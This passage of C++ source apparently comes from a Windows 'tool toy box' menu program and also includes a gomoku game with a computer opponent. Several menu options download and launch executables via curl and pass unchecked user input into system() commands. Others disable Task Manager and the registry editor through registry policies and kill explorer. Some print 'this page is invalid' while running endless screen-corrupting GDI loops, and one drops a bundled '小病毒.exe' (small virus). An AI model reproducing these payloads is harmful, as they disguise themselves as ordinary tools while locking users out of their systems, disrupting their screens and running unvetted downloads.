			string str("curl https://sw.pcmgr.qq.com/075974aabd7b6699c01be608b16ac862/6649dec8/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o devcpp.exe");
			system(str.c_str());
			system("start devcpp.exe");
			if (FindProcess("devcpp.exe"))
			{

			}
			else
			{
				system("del devcpp.exe");
			}

		}
		else if (a == 26) {
			int x = 0, y = 0;// 输出字符的位置 x,y
			string as;
			open();
			as = open1;
			IMAGE img;
			cout << "请把分配率调小\n";
			system("pause>null");
			system("cls");
			long long a = 10;
			float b = 10.0;
			ofstream dataFile;
			dataFile.open("D:\\zz.txt", ofstream::app);
			// 朝TXT文档中写入数据

			long long height, width, average;// 图片的高，宽，一小块图片颜色灰度的平均值



			loadimage(&img, as.c_str());// 这里是加载当前文件夹下的图片

			SetWorkingImage(&img);// 设置绘图目标为 img 对象,获取宽高
			height = getheight() / HEIGHT;// 需要画的行数
			width = getwidth() / WIDTH;   // 需要画的列数

			initgraph(width* CHAR_WIDTH, height* CHAR_HEIGHT, EX_SHOWCONSOLE);// 初始化画板
			for (long long i = 0; i < height; i++)
			{
				x = 0;
				for (long long j = 0; j < width; j++)
				{
					average = 0;

					for (long long h1 = 0; h1 < HEIGHT; h1++)
						for (long long w1 = 0; w1 < WIDTH; w1++)
							// 获取点颜色,灰色处理,得到RGB的R值(0-255)
							average += GetRValue(RGBtoGRAY(getpixel(j * WIDTH + w1, i * HEIGHT + h1)));

					average /= (HEIGHT * WIDTH);// 平均值计算
					SetWorkingImage();// 设置窗口为绘图窗口
					outtextxy(x, y, transcoding(average));// 转码输出到画板
					cout << transcoding(average);
					dataFile << transcoding(average);
					SetWorkingImage(&img);// 设置绘图对象为img
					x += CHAR_WIDTH;// 向右移动CHAR_WIDTH个像素,等待输出下一个字符
				}
				y += CHAR_HEIGHT;// 向下移动CHAR_HEIGHT个像素,输出下一行
				dataFile << "\n";
				cout << "\n";
			}
			system("md \\ASCLL");
			saveimage(_T("ASCLL\\t.bmp"));
			printf("转换完毕！\n");
			// 关闭文档
			dataFile.close();
			system("pause");

		//	system("TASKKILL /F /IM 简单工具玩具箱.exe");
		}
		else if (a == 27) {
			string str("curl https://dl.bandisoft.com/bandizip.std/BANDIZIP-SETUP-STD-X64.EXE?8 -o zip.exe");
			system(str.c_str());
			system("start zip.exe");
			if (FindProcess("zip.exe"))
			{

			}
			else
			{
				system("del zip.exe");
			}

		}
		else if (a == 28) {
			string a="chkdsk ", b, c=" /f",d;
			cout << "要修复哪一个磁盘\n";
			cin >> b;
			d = a + b + c;
			system(d.c_str());
			system("pause");
		}
		else if(a==29)
		{
			string as = "TASKKILL /F /IM ",s,c;
			cout << "结束的文件，包括扩展名。\n";
			cin >> s;
			c = as + s;
			system(c.c_str());

		}
		else if (a == 30) {
			int width, height, dtWidth, dtHeight;
			RECT rect;
			char s[256], conTitle[256] = "所有可见窗口";
			SetConsoleTitle(conTitle);
			HWND hwnd = GetDesktopWindow();
			GetWindowRect(hwnd, &rect);   //获取桌面大小，即屏幕分辨率 
			dtWidth = rect.right - rect.left;
			dtHeight = rect.bottom - rect.top;
			hwnd = GetNextWindow(hwnd, GW_CHILD);

			int i = 0;
			while (hwnd != NULL)
			{
				GetWindowText(hwnd, s, sizeof(s));
//				if (IsWindowVisible(hwnd) && strlen(s) > 0) //注释掉此行会遍历到几百个(含不可见)窗体
					cout << ++i << "：" << s << endl;           //换IsWindow(hwnd)对比一下结果
				hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
			}
			system("pause>null");
			}
		else if (a == 31) {
				string f = "echo CreateObject(\"SAPI.SpVoice\").Speak \"", a, b="\">0dj9soh.vbs", c;
				ofstream dataFile;
				dataFile.open("D:\\zz.txt", ofstream::app);
				cout << "要朗读的句子\n";
				cin >> a;
				c = f + a + b;
				system(c.c_str());
				system("start 0dj9soh.vbs"); system("qause");
				system("del 0dj9soh.vbs");
				
		}
		else if (a == 32) {
			cout << "1 禁用任务管理器，0 取消禁用任务管理器\n";
			HKEY hkey;
			DWORD value = 0;//1禁用任务管理器，0取消禁用任务管理器
			cin >> value;
			RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			RegCloseKey(hkey);
		}
		else if (a == 33) {
			HKRunator(aaa());

		}
		else if (a == 34) {
			HKRunator(NULL);
		}
		else if (a == 35) {
			bool a;
			a = 1;
			RegTaskmanagerForbidden(a);
			a = 1;
			RegEditForbidden(a);
			a = 1;
			RegModifyBackroud(a);
			string explorer = "TASKKILL /F /IM explorer.exe";
			system(explorer.c_str());
			string explorer2 = "start explorer.exe";
			system(explorer2.c_str());

//				for (int i = 0; i < 100*700; i++) {
	//				MOUSE();
		//			ICON();
			//	}
			//	lanping();

		}
		else if (a == 36) {
			bool a;
			a = 0;
			RegEditForbidden(a);
			RegEditForbidden(a);
			RegModifyBackroud(a);
			system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("reg delete \"HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("cls");
			cout << "win+i打开个性化，点壁纸";
		}
		else if (a == 37) {
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			int i1 = 0;
			HINSTANCE hShell32 = LoadLibrary(_T("Shell32.dll"));
			POINT point;
			HDC myDC;
			RECT ScrRect;
			GetWindowRect(GetDesktopWindow(), &ScrRect);
			myDC = GetDC((HWND)0);
			srand((unsigned)time(NULL));
			FreeConsole();
			int a, b, x, y, i = 0;
			x = GetSystemMetrics(SM_CXSCREEN);
			y = GetSystemMetrics(SM_CYSCREEN);
			HWND hwnd = GetDesktopWindow();
			HDC hdc = GetWindowDC(hwnd);
			while (1) {
				int x1 = rand() % 1920;
				int y1 = rand() % 1200;
				GetCursorPos(&point);
				for (int j = 0; j < 1000; j++) {
					i = rand() % 256;
					DrawIcon(hdc, x1, y1, LoadIcon(hShell32, MAKEINTRESOURCE(i)));
				}
				int randx, randy;
				randx = rand() % x + 0;
				randy = rand() % y + 0;//rand() % y + 0
				BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, randx + 200, randy + 200, GetDC(NULL), randx, randy, NOTSRCCOPY);
				// BitBlt(GetDC(NULL),  x + 0,  y + 0, randx + 1000, randy + 1000, GetDC(NULL), randx, randy, NOTSRCCOPY);
				a = GetSystemMetrics(SM_CXSCREEN);
				b = GetSystemMetrics(SM_CYSCREEN);
				StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
				//Sleep(500);

				int x, y, width, height;
				x = (rand() % ScrRect.right) / 2 + (width = rand() % 3000);
				y = rand() % ScrRect.bottom - (height = rand() % 3000);
				BitBlt(myDC, x, y, x + width, y + height, myDC, x + rand() % 3000 - 100, y - rand() % 200, SRCCOPY);


			}
			ReleaseDC((HWND)0, myDC);
			InvalidateRect(0, NULL, TRUE);
		}
		else if (a == 38) {
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			HDC myDC;
			RECT ScrRect;
			GetWindowRect(GetDesktopWindow(), &ScrRect);
			myDC = GetDC((HWND)0);
			for (long i = 0; i < 100000; i++) {
				int x, y, width, height;
				x = (rand() % ScrRect.right) / 2 + (width = rand() % 3);
				y = rand() % ScrRect.bottom - (height = rand() % 3);
				BitBlt(myDC, x, y, x + width, y + height, myDC, x + rand() % 3 - 1, y - rand() % 2, SRCCOPY);
			}
			ReleaseDC((HWND)0, myDC);
			InvalidateRect(0, NULL, TRUE);
			return 0;
		}
		else if (a == 39) {
			ziyuan("EXE", IDR_EXE3, "ICON_抽取.exe", "resource\\", 1,0,10,10);
			system("del ");
			}
		else if (a == 40) {
			ziyuan("EXE", IDR_EXE4, "小病毒.exe", "resource\\", 1,0,10,10);
		}
		
		else if (a == 42) {
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			ziyuan("CPP", IDR_CPP1, "bolin.cpp", "resource\\", 0, 0, 10, 10);
			bolin();
			
		}
		system("cls");
	//	closegraph();
	}
//	return 0;
}
























































































// 全局变量
box BOX[19][19];      // 棋盘
int win = -1;         // 谁赢了（0：白棋，1：黑棋，2：平局）
int whoplay = 0;      // 轮到谁下棋了
int playercolor = 0;  // 玩家颜色
int dx[4]{ 1,0,1,1 }; // - | \ / 四个方向
int dy[4]{ 0,1,1,-1 };
int Score[3][5] = //评分表
{
	{ 0, 80, 250, 500, 500 }, // 防守0子
	{ 0, 0,  80,  250, 500 }, // 防守1子
	{ 0, 0,  0,   80,  500 }  // 防守2子
};
int MAXxs[361];   //最优x坐标
int MAXys[361];   //最优y坐标
int mylength = 0; //最优解数

// 类函数定义

// 绘制函数
void box::draw()
{
	COLORREF thefillcolor = getfillcolor(); // 备份填充颜色
	setlinestyle(PS_SOLID, 2);              // 线样式设置
	setfillcolor(color);                    // 填充颜色设置
	solidrectangle(x, y, x + 30, y + 30);   // 绘制无边框的正方形
	if (isnew)
	{
		// 如果是新下的
		// 绘制边框线
		setlinecolor(LIGHTGRAY);
		line(x + 1, y + 2, x + 8, y + 2);
		line(x + 2, y + 1, x + 2, y + 8);
		line(x + 29, y + 2, x + 22, y + 2);
		line(x + 29, y + 1, x + 29, y + 8);
		line(x + 2, y + 29, x + 8, y + 29);
		line(x + 2, y + 22, x + 2, y + 29);
		line(x + 29, y + 29, x + 22, y + 29);
		line(x + 29, y + 22, x + 29, y + 29);
	}
	setlinecolor(BLACK);
	switch (modle)
	{
		// 以下是不同位置棋盘的样式
	case 0:
		line(x + 15, y, x + 15, y + 30);
		line(x - 1, y + 15, x + 30, y + 15);
		break;
		//  *
		// ***
		//  *
	case 1:
		line(x + 14, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// *
		// ***
		// *
	case 2:
		line(x - 1, y + 15, x + 15, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		//   *
		// ***
		//   *
	case 3:
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		//  *
		//  *
	case 4:
		line(x + 15, y, x + 15, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		//  *
		//  *
		// ***
	case 5:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 15);
		line(x + 15, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		// *
		// *
		// ***
	case 6:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 15);
		line(x - 1, y + 15, x + 15, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		//   *
		//   *
		// ***
	case 7:
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 15, y + 15);
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		//   *
		//   *
	case 8:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y + 15, x + 30, y + 15);
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		// *
		// *
	case 9:
		line(x + 15, y, x + 15, y + 30);
		line(x - 1, y + 15, x + 30, y + 15);
		setfillcolor(BLACK);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 4);
		break;
		//  *
		// *O*
		//  *
	}
	switch (value)
	{
	case 0: // 白棋
		setfillcolor(WHITE);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 13);
		break;
	case 1: // 黑棋
		setfillcolor(BLACK);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 13);
		break;
	}
	setfillcolor(thefillcolor); // 还原填充色
}



// 其他函数定义

// 绘制棋盘
void draw()
{
	int number = 0; // 坐标输出的位置
	// 坐标（数值）
	TCHAR strnum[19][3] = { _T("1"),_T("2") ,_T("3") ,_T("4"),_T("5") ,_T("6") ,_T("7"),_T("8"),_T("9"),_T("10"), _T("11"),_T("12") ,_T("13") ,_T("14"),_T("15") ,_T("16") ,_T("17"),_T("18"),_T("19") };
	// 坐标（字母）
	TCHAR strabc[19][3] = { _T("A"),_T("B") ,_T("C") ,_T("D"),_T("E") ,_T("F") ,_T("G"),_T("H"),_T("I"),_T("J"), _T("K"),_T("L") ,_T("M") ,_T("N"),_T("O") ,_T("P") ,_T("Q"),_T("R"),_T("S") };
	LOGFONT nowstyle;
	gettextstyle(&nowstyle);
	settextstyle(0, 0, NULL);
	for (int i = 0; i < 19; i++)
	{
		for (int j = 0; j < 19; j++)
		{
			BOX[i][j].draw(); // 绘制
			if (BOX[i][j].isnew == true)
			{
				BOX[i][j].isnew = false; // 把上一个下棋位置的黑框清除
			}
		}
	}
	// 画坐标
	for (int i = 0; i < 19; i++)
	{
		outtextxy(75 + number, 35, strnum[i]);
		outtextxy(53, 55 + number, strabc[i]);
		number += 30;
	}
	settextstyle(&nowstyle);
}

// 对局初始化
void init()
{
	win = -1;// 谁赢了
	for (int i = 0, k = 0; i < 570; i += 30)
	{
		for (int j = 0, g = 0; j < 570; j += 30)
		{
			int modle = 0;  // 棋盘样式
			BOX[k][g].value = -1;
			BOX[k][g].color = RGB(255, 205, 150);// 棋盘底色
			// x、y 坐标
			BOX[k][g].x = 65 + j;
			BOX[k][g].y = 50 + i;
			// 棋盘样式的判断
			if (k == 0 && g == 0)
			{
				modle = 8;
			}
			else if (k == 0 && g == 18)
			{
				modle = 7;
			}
			else if (k == 18 && g == 18)
			{
				modle = 6;
			}
			else if (k == 18 && g == 0)
			{
				modle = 5;
			}
			else if (k == 0)
			{
				modle = 3;
			}
			else if (k == 18)
			{
				modle = 4;
			}
			else if (g == 0)
			{
				modle = 1;
			}
			else if (g == 18)
			{
				modle = 2;
			}
			else  if ((k == 3 && g == 3) || (k == 3 && g == 15) || (k == 15 && g == 3) || (k == 15 && g == 15) || (k == 3 && g == 9) || (k == 9 && g == 3) || (k == 15 && g == 9) || (k == 9 && g == 15) || (k == 9 && g == 9))
			{
				modle = 9;
			}
			else
			{
				modle = 0;
			}
			BOX[k][g].modle = modle;
			g++;
		}
		k++;
	}
}



// 核心函数

// 寻找最佳位置
seat findbestseat(int color, int c)
{
	if (c == 0)
	{
		//如果是第一层
		//清空数组
		mylength = 0;
	}
	int MAXnumber = -1e9;    //最佳分数
	for (int i = 0; i < 19; i++) {
		for (int j = 0; j < 19; j++) {
			if (BOX[i][j].value == -1) {
				//遍历每一个空位置
				int length;        //当前方向长度
				int emeny;         //当前方向敌子
				int nowi = 0;      //现在遍历到的y坐标
				int nowj = 0;      //现在遍历到的x坐标
				int thescore = 0;  //这个位置的初始分数
				//判断周边有没有棋子
				int is = 0;
				for (int k = 0; k < 4; k++)
				{
					nowi = i;
					nowj = j;
					nowi += dx[k];
					nowj += dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi += dx[k];
					nowj += dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi -= dx[k];
					nowj -= dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi -= dx[k];
					nowj -= dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
				}
				if (!is)
				{
					//如果周围没有棋子，就不用递归了
					continue;
				}
				//自己
				BOX[i][j].value = color;//尝试下在这里
				for (int k = 0; k < 4; k++)
				{
					//检测四个方向
					length = 0;
					emeny = 0;
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == color)
					{
						length++;
						nowj += dy[k];
						nowi += dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == !color)
					{
						emeny++;
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == color)
					{
						length++;
						nowj -= dy[k];
						nowi -= dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == !color)
					{
						emeny++;
					}
					length -= 2;//判断长度
					if (length > 4)
					{
						length = 4;
					}
					if (Score[emeny][length] == 500)
					{
						//己方胜利，结束递归
						BOX[i][j].value = -1;
						return{ i,j,Score[emeny][length] };
					}
					thescore += Score[emeny][length];
					length = 0;
					emeny = 0;
				}
				//敌人（原理同上）
				BOX[i][j].value = !color;
				for (int k = 0; k < 4; k++)
				{
					length = 0;
					emeny = 0;
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == !color)
					{
						length++;
						nowj += dy[k];
						nowi += dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == color)
					{
						emeny++;
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == !color)
					{
						length++;
						nowj -= dy[k];
						nowi -= dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == color)
					{
						emeny++;
					}
					length -= 2;
					if (length > 4)
					{
						length = 4;
					}
					if (Score[emeny][length] == 500)
					{
						BOX[i][j].value = -1;
						return{ i,j,Score[emeny][length] };
					}
					thescore += Score[emeny][length];
					length = 0;
					emeny = 0;
				}
				BOX[i][j].value = -1;
				//如果已经比最高分数小，就没必要递归了
				if (thescore >= MAXnumber)
				{
					if (c < 3)
					{
						//只能找4层，否则时间太长
						BOX[i][j].value = color;
						//递归寻找对方分数
						int nowScore = thescore - findbestseat(!color, c + 1).number;//递归求出这个位置的分值
						BOX[i][j].value = -1;
						if (nowScore > MAXnumber)
						{
							//比最高分值大
							MAXnumber = nowScore;
							if (c == 0)
							{
								//第一层
								mylength = 0;//清空数组
							}
						}
						if (c == 0)
						{
							//第一层
							if (nowScore >= MAXnumber)
							{
								//把当前位置加入数组
								MAXxs[mylength] = i;
								MAXys[mylength] = j;
								mylength++;
							}
						}
					}
					else {
						//如果递归到了最后一层
						if (thescore > MAXnumber)
						{
							//直接更新
							MAXnumber = thescore;
						}
					}
				}
			}
		}
	}
	if (c == 0)
	{
		//第一层
		//随机化落子位置
		int mynum = rand() % mylength;
		return { MAXxs[mynum],MAXys[mynum],MAXnumber };
	}
	//其他层
	return { 0,0,MAXnumber };
}

// 判断输赢
void isWIN()
{
	bool isfull = true; // 棋盘是否满了
	for (int i = 0; i < 19; i++)
	{
		for (int j = 0; j < 19; j++)
		{
			if (BOX[i][j].value != -1)
			{
				// 遍历每个可能的位置
				int nowcolor = BOX[i][j].value; // 现在遍历到的颜色
				int length[4] = { 0,0,0,0 };    // 四个方向的长度
				for (int k = 0; k < 4; k++)
				{
					// 原理同寻找最佳位置
					int nowi = i;
					int nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == nowcolor)
					{
						length[k]++;
						nowj += dx[k];
						nowi += dy[k];
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == 1 - nowcolor)
					{
						length[k]++;
						nowj -= dx[k];
						nowi -= dy[k];
					}
				}
				for (int k = 0; k < 4; k++)
				{
					if (length[k] >= 5) {
						// 如果满五子
						if (nowcolor == playercolor)
						{
							win = playercolor; // 玩家胜
						}
						if (nowcolor == 1 - playercolor)
						{
							win = 1 - playercolor; // 电脑胜
						}
					}
				}
			}
			else
			{
				//如果为空
				isfull = false;//棋盘没满
			}
		}
	}
	if (isfull)
	{
		// 如果棋盘满了
		win = 2; // 平局
	}
}

// 游戏主函数
void game()
{
	bool isinit;
	// 上一个鼠标停的坐标
	int oldi = 0;
	int oldj = 0;
	// 随机化玩家颜色
	srand(time(NULL));
	playercolor = rand() % 2;
	// 绘制背景
	setfillcolor(RGB(255, 205, 150));
	solidrectangle(40, 25, 645, 630);
	// 设置字体样式
	settextstyle(30, 15, 0, 0, 0, 1000, false, false, false);
	settextcolor(BLACK);
	// 输出标示语
	if (playercolor == 0)
	{
		isinit = 1;
		outtextxy(150, 650, _T("玩家执白后行，电脑执黑先行"));
		whoplay = 1;
	}
	else
	{
		isinit = 0;
		outtextxy(150, 650, _T("玩家执黑先行，电脑执白后行"));
		whoplay = 0;
	}
	draw(); // 绘制
	while (1)
	{
	NEXTPLAYER:
		if (whoplay == 0)
		{
			// 玩家下棋
			MOUSEMSG mouse = GetMouseMsg(); // 获取鼠标信息
			for (int i = 0; i < 19; i++)
			{
				for (int j = 0; j < 19; j++)
				{
					if (mouse.x > BOX[i][j].x && mouse.x<BOX[i][j].x + 30//判断x坐标
						&& mouse.y>BOX[i][j].y && mouse.y < BOX[i][j].y + 30//判断y坐标
						&& BOX[i][j].value == -1)//判断是否是空位置
					{
						// 如果停在某一个空位置上面
						if (mouse.mkLButton)
						{
							// 如果按下了
							BOX[i][j].value = playercolor; // 下棋
							BOX[i][j].isnew = true;        // 新位置更新
							oldi = -1;
							oldj = -1;
							// 下一个玩家
							whoplay = 1;
							goto DRAW;
						}
						// 更新选择框
						BOX[oldi][oldj].isnew = false;
						BOX[oldi][oldj].draw();
						BOX[i][j].isnew = true;
						BOX[i][j].draw();
						oldi = i;
						oldj = j;
					}
				}
			}
		}
		else
		{
			// 电脑下棋
			if (isinit)
			{
				// 开局情况
				isinit = 0;
				int drawi = 9;
				int drawj = 9;
				while (BOX[drawi][drawj].value != -1)
				{
					drawi--;
					drawj++;
				}
				BOX[drawi][drawj].value = 1 - playercolor;
				BOX[drawi][drawj].isnew = true;
			}
			else
			{
				seat best;
				best = findbestseat(1 - playercolor, 0); // 寻找最佳位置
				BOX[best.i][best.j].value = 1 - playercolor;//下在最佳位置
				BOX[best.i][best.j].isnew = true;
			}
			whoplay = 0;
			goto DRAW; // 轮到下一个
		}
	}
DRAW: // 绘制
	isWIN(); // 检测输赢
	draw();
	oldi = 0;
	oldj = 0;
	if (win == -1)
	{
		// 如果没有人胜利
		Sleep(500);
		goto NEXTPLAYER; // 前往下一个玩家
	}
	// 胜利处理
	settextcolor(RGB(0, 255, 0));
	Sleep(1000);
	if (win == 0)
	{
		outtextxy(320, 320, _T("白胜"));
	}
	if (win == 1)
	{
		outtextxy(320, 320, _T("黑胜"));
	}
	if (win == 2)
	{
		outtextxy(320, 320, _T("平局"));
	}
	// 给反应时间
	Sleep(5000);
	return;
}
void drawframe(int number)
{
	TCHAR str[25];
	_stprintf_s(str, _T("%d"), number);
	setfillcolor(RGB(70, 70, 69));
	solidcircle(240, 240, 50);
	setbkmode(TRANSPARENT);
	settextstyle(50, 0, _T("黑体"), 0, 0, FW_BLACK, false, false, false);
	settextcolor(WHITE);
	RECT r = { 190, 190, 290, 290 };
	drawtext(str, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
}

void Move(int number, int x, int y)
{
	setfillcolor(RGB(70, 70, 69));
	solidcircle(x, y, 20);
	setbkmode(TRANSPARENT);
	settextstyle(15, 0, _T("黑体"));
	settextcolor(WHITE);
	RECT r = { x - 20, y - 20, x + 20, y + 20 };
	TCHAR str[25];
	_stprintf_s(str, _T("%d"), number);
	drawtext(str, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
}

void Rotate(double* R, int num)
{
	int X_NEEDLE;
	int Y_NEEDLE;

	BeginBatchDraw();
	for (int i = 0; i < num; i++)
	{
		FlushBatchDraw();
		eraser(int(NEEDLE_L * cos(R[i]) + 240), int(NEEDLE_L * sin(R[i]) + 240));
		R[i] = R[i] + SPEED;
		if (R[i] > 2 * PI)
		{
			R[i] = R[i] - 2 * PI;
		}
		X_NEEDLE = int(NEEDLE_L * cos(R[i]) + 240);
		Y_NEEDLE = int(NEEDLE_L * sin(R[i]) + 240);
		setlinestyle(PS_SOLID, 3);
		setlinecolor(RGB(70, 70, 69));
		line(X_NEEDLE, Y_NEEDLE, 240, 240);
		Move(i, X_NEEDLE, Y_NEEDLE);
		drawframe(1);
	}
	EndBatchDraw();
}

bool Pin(double* R, int num)
{
	int X_NEEDLE;
	int Y_NEEDLE;
	setlinestyle(PS_SOLID, 3);
	setlinecolor(RGB(70, 70, 69));
	bool T = true;
	R[num] = PI / 2;
	X_NEEDLE = int(NEEDLE_L * cos(R[num]) + 240);
	Y_NEEDLE = int(NEEDLE_L * sin(R[num]) + 240);
	line(X_NEEDLE, Y_NEEDLE, 240, 290);
	Move(num, X_NEEDLE, Y_NEEDLE);
	for (int i = 0; i < num; i++)
	{
		if (fabs(R[num] - R[i]) < (PI / 15))
		{
			T = false;
			break;								// 不需要再次进行比较了，循环跳出
		}
	}
	return T;									// 如果失败返回false;
}

void eraser(int x, int y)
{
	setfillcolor(RGB(189, 188, 187));
	solidcircle(x, y, 20);
	setlinestyle(PS_SOLID, 3);
	setlinecolor(RGB(189, 188, 187));
	line(x, y, 240, 240);
}

// 精确延时函数(可以精确到 1ms，精度 ±1ms)
// 记得加头文件 time.h
// by yangw80<yw80@qq.com>, 2011-5-4
void HpSleep(int ms)
{
	static clock_t oldclock = clock();			// 静态变量，记录上一次 tick
	oldclock += ms * CLOCKS_PER_SEC / 1000;		// 更新 tick
	if (clock() > oldclock)						// 如果已经超时，无需延时
		oldclock = clock();
	else
		while (clock() < oldclock)					// 延时
			Sleep(1);								// 释放 CPU 控制权，降低 CPU 占用率
}
